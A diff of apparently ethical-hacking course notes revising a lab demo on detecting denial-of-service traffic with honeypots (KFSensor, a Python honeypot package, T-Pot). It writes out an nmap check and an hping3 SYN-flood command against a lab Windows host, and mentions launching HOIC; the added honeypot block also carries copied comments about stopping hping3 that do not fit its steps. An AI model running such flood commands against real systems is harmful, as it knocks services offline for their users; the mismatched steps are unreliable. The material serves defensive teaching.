@@ -423,24 +423,54 @@ Responding to Denial-of-Service Attacks
 
 💡 Demo
 ---
-- [Detecting DoS Attack traffic](https://github.com/Samsar4/Ethical-Hacking-Labs/blob/master/9-Denial-of-Service/3-Detecting-DoS-Traffic.md)
-- On Windows server
-  - Download and install [KFSensor](http://www.keyfocus.net/kfsensor/) and [Wireshark](https://www.wireshark.org/)
-  - Run KFSensor and setup DoS options
-- On Karrot
-  ```bash
-  # 1. check if port 80 is open on Windows
-  nmap -p 80 WindowsIP
-  # 2. Launch SYN flooding attack against Windows IIS
-  hping3 -d 100 -S -p 80 --flood WindowsIP
-  # 3. go back to Windows and see it becomes almost irresponsive
-  # which means the related resources of Windows are completely exhausted. 
-  # This means that the DoS attack is being successfully performed
-  # 4. In Parrot, press CTRL+C to stop hping3
-  ```
-- Go back to Windows
-  - check that KFSensor detected the DoS attack
-  - analyze packet dump from KFSensor with Wireshark
+- Explore the list of [awesome honeypots](https://github.com/paralax/awesome-honeypots)
+- [Detecting DoS attack traffic with honeypots](https://github.com/qeeqbox/honeypots)
+  - On Karrot
+    ```bash
+    # 1. Install honeypots
+    sudo apt-get install postgresql
+    sudo apt-get install python-psycopg2
+    sudo apt-get install libpq-dev
+    pip3 install honeypots
+
+    # 2. Setup the honeypot of http 
+    sudo -E python3 -m honeypots --setup http
+
+    # 3. Access the honeypot locally 
+    http://localhost
+    # from Windows
+    http://parrotIP
+
+    # 3. go back to Windows and see it becomes almost irresponsive
+    # which means the related resources of Windows are completely exhausted. 
+    # This means that the DoS attack is being successfully performed
+    # 4. In Parrot, press CTRL+C to stop hping3
+    ```
+  - On Windows server
+    - Launch DoS attack on Parrot with HOIC
+  - Go back to Parrot Linux
+    - check that the honeypot detected the DoS attack
+    - analyze packet dump from the honeypot with Wireshark
+
+- [Detecting Dos attack traffic with T-Pot - The All In One Multi Honeypot Platform](https://github.com/telekom-security/tpotce)
+- [Detecting DoS Attack traffic with KFSensor](https://github.com/Samsar4/Ethical-Hacking-Labs/blob/master/9-Denial-of-Service/3-Detecting-DoS-Traffic.md)
+  - On Windows server
+    - Download and install [KFSensor](http://www.keyfocus.net/kfsensor/) and [Wireshark](https://www.wireshark.org/)
+    - Run KFSensor and setup DoS options
+  - On Karrot
+    ```bash
+    # 1. check if port 80 is open on Windows
+    nmap -p 80 WindowsIP
+    # 2. Launch SYN flooding attack against Windows IIS
+    hping3 -d 100 -S -p 80 --flood WindowsIP
+    # 3. go back to Windows and see it becomes almost irresponsive
+    # which means the related resources of Windows are completely exhausted. 
+    # This means that the DoS attack is being successfully performed
+    # 4. In Parrot, press CTRL+C to stop hping3
+    ```
+  - Go back to Windows
+    - check that KFSensor detected the DoS attack
+    - analyze packet dump from KFSensor with Wireshark
 
 
 # References
